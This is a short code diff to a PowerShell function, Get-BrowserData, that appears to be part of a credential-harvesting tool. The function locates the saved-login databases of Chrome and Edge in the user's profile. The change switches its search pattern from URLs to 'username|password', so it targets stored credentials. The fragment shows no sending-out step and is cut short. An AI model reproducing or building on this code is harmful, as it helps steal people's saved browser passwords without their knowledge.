@@ -8,7 +8,7 @@ function Get-BrowserData {
     [string]$DataType 
     ) 
 
-    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+    $regex = 'username|password'
 
     if     ($Browser -eq 'chrome'  -and $DataType -eq 'login'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"}
     elseif ($Browser -eq 'edge'    -and $DataType -eq 'login'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/Login Data"}
